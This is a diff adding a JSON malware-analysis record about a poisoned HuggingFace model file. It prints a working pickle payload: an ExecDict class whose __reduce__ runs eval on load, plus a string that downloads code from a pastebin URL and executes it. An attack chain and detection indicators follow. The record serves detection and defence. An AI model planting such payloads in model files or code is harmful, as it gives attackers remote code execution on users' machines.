@@ -1,0 +1,101 @@
+{
+  "package_info": {
+    "package_name": "ykilcher/totally-harmless-model (and gpt2-rs as example)",
+    "package_manager": "HuggingFace Model Hub",
+    "package_versions": "N/A (model artifact, not versioned as code package)",
+    "why_malicious": "The model artifact contains a maliciously crafted pickle payload that executes arbitrary code upon loading. Specifically, it abuses the PyTorch model deserialization process to trigger remote code execution, demonstrating the risk of loading untrusted model files from the HuggingFace Model Hub."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time (model loading via deserialization)",
+        "file_location": "model state_dict (PyTorch .bin file, embedded as PAYLOAD in pickle data)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "PAYLOAD = \"\"\"\nimport urllib.request\nexec(urllib.request.urlopen(\"https://pastebin.com/raw/sVvZph7V\").read().decode())\n\"\"\"",
+      "code_language": "python",
+      "code_behavior": "At import-time during model loading, the code uses urllib.request to fetch a remote Python script from pastebin.com, then executes the downloaded code using exec, resulting in arbitrary code execution sourced from an external domain.",
+      "malice_analysis": {
+        "why_suspicious": "The code fetches and executes remote content during deserialization, which is a classic remote code execution (RCE) technique and highly abnormal for model loading.",
+        "violated_expectations": "Normal model loading should only reconstruct model weights and configuration from disk, never perform network requests or execute code from external sources.",
+        "similar_legitimate_use": "Dynamic code loading is extremely rare in model deserialization and would never involve fetching and executing code from the internet in a legitimate context.",
+        "key_indicators": [
+          "Use of exec() on data fetched from a remote URL",
+          "Network request to pastebin.com during model deserialization",
+          "Python code embedded as a string payload within a model artifact"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "import-time (model loading via pickle deserialization)",
+        "file_location": "model state_dict (PyTorch .bin file, via custom dict subclass ExecDict in pickle payload)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "class ExecDict(dict):\n    def __reduce__(self):\n        return eval, (f\"exec('''{PAYLOAD}''') or dict()\",), None, None, iter(self.items())",
+      "code_language": "python",
+      "code_behavior": "At import-time during model loading, the custom ExecDict class triggers its __reduce__ method during pickle deserialization, which invokes eval to execute the PAYLOAD string, causing arbitrary code execution as a side effect of loading the model.",
+      "malice_analysis": {
+        "why_suspicious": "Overriding __reduce__ to execute code during unpickling is a well-known and dangerous pickle deserialization attack vector, enabling code execution without user interaction.",
+        "violated_expectations": "Deserialization should only reconstruct object state, not execute arbitrary code or perform side effects.",
+        "similar_legitimate_use": "Custom __reduce__ methods are used for advanced serialization, but never to execute code or perform actions beyond object reconstruction.",
+        "key_indicators": [
+          "Custom __reduce__ method returning eval or exec",
+          "Payload string embedded in serialization logic",
+          "Abuse of pickle protocol to trigger code execution during deserialization"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "User loads the malicious model using AutoModel.from_pretrained or a similar HuggingFace API, which initiates deserialization of the model state_dict.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Triggers unpickling of the malicious ExecDict object embedded in the model artifact."
+    },
+    {
+      "step": 2,
+      "action": "During unpickling, the custom ExecDict.__reduce__ method is invoked, which executes the embedded PAYLOAD string using eval.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_1"
+      ],
+      "leads_to": "PAYLOAD is executed, causing the model loading process to fetch and run remote code."
+    },
+    {
+      "step": 3,
+      "action": "The PAYLOAD fetches a remote Python script from pastebin.com and executes it on the victim's machine.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Attacker achieves arbitrary code execution on the victim's system, completing the attack."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Model loading triggers unexpected outbound network requests",
+      "Model deserialization executes code via exec or eval functions",
+      "Presence of custom __reduce__ methods in objects within model artifacts"
+    ],
+    "file_indicators": [
+      "PyTorch .bin files containing custom object types such as ExecDict",
+      "Model files with embedded strings referencing exec, urllib, requests, or __reduce__",
+      "Pickle payloads with suspicious code patterns or function references (e.g., eval, exec)"
+    ],
+    "network_indicators": [
+      "Outbound HTTP requests to pastebin.com/raw/sVvZph7V or similar code hosting domains during model loading",
+      "Unexpected network activity from Python processes at the time of model deserialization"
+    ],
+    "how_to_detect": "Monitor for network requests and code execution events during model loading, statically scan model files for custom __reduce__ methods or embedded code patterns, and use tools like Picklescan to analyze pickle payloads for dangerous constructs. Prefer secure serialization formats such as safetensors to mitigate this class of attack."
+  }
+}
